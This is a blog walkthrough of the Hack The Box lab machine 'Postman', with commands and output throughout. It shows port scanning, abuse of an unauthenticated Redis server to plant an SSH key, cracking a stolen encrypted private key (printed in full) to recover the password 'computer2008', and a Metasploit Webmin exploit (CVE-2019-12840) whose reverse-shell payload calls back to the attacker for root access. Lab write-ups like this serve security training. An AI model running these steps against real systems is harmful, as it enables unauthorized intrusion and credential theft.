# [Grav3m1ndbyte's Resources Blog](/index.md) > [Hack The Box Retired Machines Walkthroughs](/HTB-Retired/HTB-RetiredMachines.md)


# Postman

![Postman Infocard](images/Postman.png)



## Information Gathering / Footprinting and Scanning

First of, we need to identify how to reach the system. In other words, we need to identify what are the services available from this machine.

Let's start by adding this machine's IP address to the hosts file and create an alias:

```
root@kali:~/Documents/HTB-Labs/Postman# echo "10.10.10.160  postman.htb" >> /etc/hosts
```

My go-to tools in this phase, which are typically used by many to start enumerating, are:

1) masscan: very nice port scanning tool that allows finding open ports quickly. To me this is a tool to narrow down the scope of the enumeration so we can focus on open ports only when using nmap.

Here, I am designating the interface to use when communitcating to the HTB machine (-e) which will be the HTB VPN interface, along with -p to designate the port range to target but I will target ALL TCP and UDP Ports, and the transmission rate of packets per second (--rate).

2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.

What I typically start with when using nmap is -sC to use all default non-intrusive nmap scripts on each service and -sV to get the service version information which is definitely important for us. Along with these two, we need to designate the port we will be targeting (-p) and personally I like to have as much verbosity as I can get in some cases, so I use -vvvv.

```
root@kali:~/Documents/HTB-Labs/Postman# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.160 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-07 15:52:46 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 10000/tcp on 10.10.10.160                                 
Discovered open port 22/tcp on 10.10.10.160                                    
Discovered open port 10000/udp on 10.10.10.160                                 
Discovered open port 6379/tcp on 10.10.10.160                                  
Discovered open port 80/tcp on 10.10.10.160                                    
^Cwaiting several seconds to exit...

root@kali:~/Documents/HTB-Labs/Postman# nmap -sC -sV -p22,80,6379,10000 -vvvv postman.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 11:08 EST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:08
Completed NSE at 11:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:08
Completed NSE at 11:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:08
Completed NSE at 11:08, 0.00s elapsed
Initiating Ping Scan at 11:08
Scanning postman.htb (10.10.10.160) [4 ports]
Completed Ping Scan at 11:08, 0.29s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:08
Scanning postman.htb (10.10.10.160) [4 ports]
Discovered open port 22/tcp on 10.10.10.160
Discovered open port 6379/tcp on 10.10.10.160
Discovered open port 80/tcp on 10.10.10.160
Discovered open port 10000/tcp on 10.10.10.160
Completed SYN Stealth Scan at 11:08, 0.17s elapsed (4 total ports)
Initiating Service scan at 11:08
Scanning 4 services on postman.htb (10.10.10.160)
Completed Service scan at 11:08, 6.37s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against postman.htb (10.10.10.160)
Retrying OS detection (try #2) against postman.htb (10.10.10.160)
Initiating Traceroute at 11:08
Completed Traceroute at 11:08, 0.28s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:08
Completed Parallel DNS resolution of 2 hosts. at 11:08, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.10.160.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:08
Completed NSE at 11:09, 30.29s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Nmap scan report for postman.htb (10.10.10.160)
Host is up, received reset ttl 63 (0.16s latency).
Scanned at 2020-01-07 11:08:30 EST for 44s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=1/7%OT=22%CT=%CU=40752%PV=Y%DS=2%DC=T%G=N%TM=5E14AD2A%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 10.801 days (since Fri Dec 27 15:55:33 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   199.29 ms 10.10.14.1
2   199.93 ms postman.htb (10.10.10.160)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.51 seconds
           Raw packets sent: 63 (4.368KB) | Rcvd: 45 (3.240KB)
```
Through nmap we found 4 services available; TCP22 (SSH), TCP80 (HTTP running on an Apache Webserver), TCP6379 (Redis Server), and TCP10000 (Webmin Server).

A couple of take-offs from this finding is:

1) Attacking SSH directly as a first step will be a waste of time and hard to get anywhere.

2) We can attempt to start with HTTP and see what is there as apparently there is a site using the http-title "The Cyber Geek's Personal Website".

3) Redis Server is available (TCP6379) which is a key-value in-memory data structure/database server. Just like anything in this field, if it's not properly setup, it could allow an attacker get access to the system or information hosted. An important aspect of this service is that it seems to be running on version 4.0.9.

4) Webmin available on its default port TCP10000. This web application allows easy linux system management through a web interface. Just like applications handling sensitive information or handling system resources, it prompts for authentication through an encrypted HTTP service so you can access the appliction. The version currently used here is 1.910.

We can use the information from these two services (Redis and Webmin) to find if there are exploits available or simply documented flaws.

Below, we used dirb on the HTTP service simply to find if there is any web page or directory available on HTTP.
```
root@kali:~/Documents/HTB-Labs/Postman# dirb http://postman.htb /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jan  7 11:19:18 2020
URL_BASE: http://postman.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://postman.htb/ ----
==> DIRECTORY: http://postman.htb/css/                                                                                                                                                                            
==> DIRECTORY: http://postman.htb/fonts/                                                                                                                                                                          
==> DIRECTORY: http://postman.htb/images/                                                                                                                                                                         
+ http://postman.htb/index.html (CODE:200|SIZE:3844)                                                                                                                                                              
==> DIRECTORY: http://postman.htb/js/                                                                                                                                                                             
+ http://postman.htb/server-status (CODE:403|SIZE:299)                                                                                                                                                            
==> DIRECTORY: http://postman.htb/upload/                                                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://postman.htb/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://postman.htb/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://postman.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://postman.htb/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://postman.htb/upload/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jan  7 11:34:19 2020
DOWNLOADED: 4612 - FOUND: 2
```
As we only found index.html and not much is there we can move to another service.

Another one to point out is and as mentioned earlier, you need credentials to access Webmin and it seems to be vulnerable to an unauthenticated RCE (CVE-2019-15107) reintroduced on releases 1.900 through 1.920 through the password_change.cgi page but it seems to be restricted as it can be locked down.

Also, it seems to be vulnerable to another RCE through the Package Updates functionality (CVE-2019-12840) which allows any authorized user to the 'Package Updates' module to execute commands with root privileges, which means it will let us escalate privileges. This last one is also restricted as you would have to be authenticated, and we found that this exploit has a Metasploit module that we can use.



## Exploitation and Gaining Access


##### Exploiting an unauthenticated RCE vulnerability in Redis:

As explained on [Victor Zhu's post in Medium](https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419) we can attempt to exploit a vulnerability in Redis were you can push a SSH Public Key (authorized_key) as the Redis configuration. In some instances Redis could be running as the root user, but in other, just like some services (Apache for example) it could be running with its own service account, typically redis would be the username.

If I remember correctly, this flaw is something that could be configured to prevent it from happening, and along with this, you always have to make sure any service you configure does NOT allow anonymous authentication like FTP allows if not configured properly.

To interact with Redis, we need to install or have available redis-cli. Let's first create a SSH public/private key pairs for the redis user under postman.htb host.

```
root@kali:~/Documents/HTB-Labs/Postman# ssh-keygen -t rsa -b 4096 -C "redis@postman.htb"
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa.
Your public key has been saved in ./id_rsa.pub.
The key fingerprint is:
SHA256:JzR/c/6ghZ32fkfbdeYNPrmLTJ/MAMSux+ODyP8PFsQ redis@postman.htb
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|         o       |
|        o E      |
|       . *       |
|        S * o .  |
|         = + *..=|
|     . ...* +.B**|
|      o .+.= X+**|
|       ...oo= B=*|
+----[SHA256]-----+

root@kali:~/Documents/HTB-Labs/Postman# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
```

Now that we had created the SSH key pair and saved the Public Key to temp.txt, let's try to interact with Redis and upload temp.txt as a configuration file of Redis. Something to mention is that at this point we already attempted to access Redis anonymously and complete successful.
```
root@kali:~/Documents/HTB-Labs/Postman# cat temp.txt | redis-cli -h postman.htb -x set s-key
OK
root@kali:~/Documents/HTB-Labs/Postman# redis-cli -h postman.htb
postman.htb:6379> config get dir
1) "dir"
2) "/var/lib/redis"
postman.htb:6379> config set dir /var/lib/redis/.ssh
OK
postman.htb:6379> config set dbfilename authorized_keys
OK
postman.htb:6379> save
OK
postman.htb:6379> quit
```

As we were successful at uploading temp.txt, let's try to authenticate through SSH using the private key we created.
```
root@kali:~/Documents/HTB-Labs/Postman# ssh -i id_rsa redis@postman.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ 
```

AND we have access to the system as the redis user (shown above). After doing some further enumeration, we found there is another user account in this system, Matt, and also a "backup" SSH private key which probably belongs to this user as there is no other account that can run a shell or is allowed to login. Let's take a look at this private key and copy it to our system.
```
redis@Postman:~$ cd /opt/
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ exit
logout
Connection to postman.htb closed.
```

As we copied the private to our system we can try to use it.
```
root@kali:~/Documents/HTB-Labs/Postman# ssh -i matt_id_rsa matt@postman.htb
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'matt_id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "matt_id_rsa": bad permissions
matt@postman.htb's password: 
```

OOPS! Basically, not only we missed to set the proper permissions on the private key from the user found (Matt), but also this private key has a passphrase we need to crack, in this case using John the Ripper with rockyou.txt wordlist. Let do this!
```
root@kali:~/Documents/HTB-Labs/Postman# chmod 0600 matt_id_rsa 
```
Before running the private key through JtR, we need to convert it from SSH to JtR format. Then we can run it against JtR.


##### JohntheRipper:
```
root@kali:~/Documents/HTB-Labs/Postman# ssh2john matt_id_rsa > matt_hash
root@kali:~/Documents/HTB-Labs/Postman# john --wordlist=/usr/share/wordlists/rockyou.txt matt_hash > matt_hash_decoded
Using default input encoding: UTF-8
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:13 DONE (2020-01-06 23:58) 0.07633g/s 1094Kp/s 1094Kc/s 1094KC/sa6_123..*7¡Vamos!
Session completed
root@kali:~/Documents/HTB-Labs/Postman# cat matt_hash_decoded 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
computer2008     (matt_id_rsa)
```

The passphrase has been cracked **(computer2008)**, let's proceed with SSH.
```
root@kali:~/Documents/HTB-Labs/Postman# ssh -i matt_id_rsa matt@postman.htb
Enter passphrase for key 'matt_id_rsa': 
Connection closed by 10.10.10.160 port 22
root@kali:~/Documents/HTB-Labs/Postman# ssh -i id_rsa redis@postman.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jan  7 04:43:59 2020 from 10.10.14.28
redis@Postman:~$ su - Matt
Password: 
Matt@Postman:~$ pwd
/home/Matt
Matt@Postman:~$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:~$ cat user.txt
517ad0*********************a2f3c
Matt@Postman:~$ 
```
**AND BOOM!! Not only we were successful at accessing the system as Matt, but we also found the user flag (obviously masked)!



## Privilege Escalation

Something to mention here before we start is that before moving forward we attempted to use the private key passphrase as Matt's password in Webmin successfully, which means the passphrase is also Matt's password on the system (something is commonly done and technically defeats the purpose of using private keys to authenticate through SSH.

This same password will be used when exploiting the 'Package Updates RCE' vulnerability (CVE-2019-12840) through the Metasploit module.

##### Using Metasploit:
```
root@kali:~/Documents/HTB-Labs/Postman# msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v5.0.72-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > 
```
I am breaking the output here simply to explain that we are basically setting up the options that will be used by the exploit we will be using after calling it (in simpler terms).
```
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
RHOSTS => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set TARGETURI /
TARGETURI => /
msf5 exploit(linux/http/webmin_packageup_rce) > set TARGET 0
TARGET => 0
msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set LPORT 26446
LPORT => 26446
[-] The value specified for PAYLOAD is not valid.
msf5 exploit(linux/http/webmin_packageup_rce) > set RPORT 80
RPORT => 80
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL 0
SSL => 0
```
Now, let's show the options setup and try to run it (we need to catch a mistake done on purpose).
```
msf5 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        0                no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  26446            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910

```

One mistake was caught, we forgot to setup the SSL option; remember we mentioned Webmin uses HTTPS.
```
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL 1
SSL => 1
msf5 exploit(linux/http/webmin_packageup_rce) > run -j
[*] Exploit running as background job 18.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.28:26446 
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
```

Another error here: Webmin does NOT run on TCP80 and its default port is TCP10000. We need to keep this in mind.
```
msf5 exploit(linux/http/webmin_packageup_rce) > set rport 10000
rport => 10000
msf5 exploit(linux/http/webmin_packageup_rce) > exploit -j
[*] Exploit running as background job 19.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.28:26446 
[+] Session cookie: ee591b8b1c14c1aea3d1819d7c5e2064
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.28:26446 -> 10.10.10.160:45702) at 2020-01-07 00:08:43 -0500
```
And we now have a Shell Session created on postman.htb. Let's interact with it and see where are located, the user this shell is running as (should be root per the vulnerability) and let's try and get that Root Flag.


##### Root Shell:
```
msf5 > sessions 1
[*] Starting interaction with 1...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/usr/share/webmin/package-updates
$ cat /root/root.txt
a2577********************686ddce
```

AND we Rooted Postman and got the Root Flag!!

PS: This whole write-up looks straight forward but something to keep in mind is we are not perfect AND along the way while learning, we can make mistakes or end up going down rabbitholes. Be patient and try not to get frustrated and if you do, step out for a little bit. Go to the forum, go to Discord, contact other members that had rooted or completed the boxes. There is a lot of people wiliing to help.

Also, on the final phase, we used Metasploit, but keep in mind you cannot always rely on Metasploit. Force yourself in using other tools.
